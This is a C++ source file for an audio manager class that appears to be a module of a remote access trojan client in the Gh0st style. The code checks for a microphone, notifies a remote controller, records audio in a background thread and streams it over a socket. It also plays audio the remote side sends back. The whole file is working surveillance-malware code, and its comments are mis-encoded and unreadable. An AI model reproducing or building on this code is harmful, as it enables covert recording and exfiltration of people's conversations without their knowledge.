#include "AudioManager.h"


bool CAudioManager::m_bIsWorking = false;

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	if (!Initialize())        //��ʼ��
		return;

	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	// Wait for remote dialog open and init
	WaitForDialogOpen();    //�ȴ��Ի����
	//���������߳�  ת����������
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	m_bIsWorking = false;          //�趨����״̬Ϊ��
	WaitForSingleObject(m_hWorkThread, INFINITE);    //�ȴ� �����߳̽���
	delete	m_lpAudio;    //�ͷŷ���Ķ����ڴ�
}


bool CAudioManager::Initialize()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	if (!waveInGetNumDevs())   //��ȡ���������豸����Ŀ  ʵ�ʾ��ǿ�����û������
		return false;

	// ����ʹ����.. ��ֹ�ظ�ʹ��
	if (m_bIsWorking)
		return false;

	m_lpAudio = new CAudio;

	m_bIsWorking = true;
	return true;
	//���ع��캯��
}


DWORD WINAPI CAudioManager::WorkThread(LPVOID lparam)
{
	//������Ϊֹ���ǻ�û�п��� ¼�����õ���Ƶ���ݵĺ�����
	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bIsWorking)
		pThis->sendRecordBuffer();     //һ��ѭ�� �����������ݣ�����ת�����忴��

	return -1;
}

int CAudioManager::sendRecordBuffer()
{
	// TODO: �ڴ˴����ʵ�ִ���.
	//�������Ҳ�ܼ� 
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	//����õ� ��Ƶ����
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;
	//���仺����
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	//��������ͷ
	lpPacket[0] = TOKEN_AUDIO_DATA;     //��ס�������ͷ��һ�����ǻᵽ���ض�����
	//���ƻ�����
	memcpy(lpPacket + 1, lpBuffer, dwBytes);
	//���ͳ�ȥ
	if (dwBytes > 0)
		nSendBytes = Send(lpPacket, dwBytes + 1);
	delete	lpPacket;

	return nSendBytes;

	//����û������������п���¼����Ƶ�Ĵ��� ����¼����Ƶ�Ĵ���д�������أ�
	//����ע�⵽����õ���Ƶ�������ĺ���getRecordBuffer ��ת�����Ķ��忴��
}




void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: �ڴ˴����ʵ�ִ���.
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->playBuffer(lpBuffer, nSize);
}
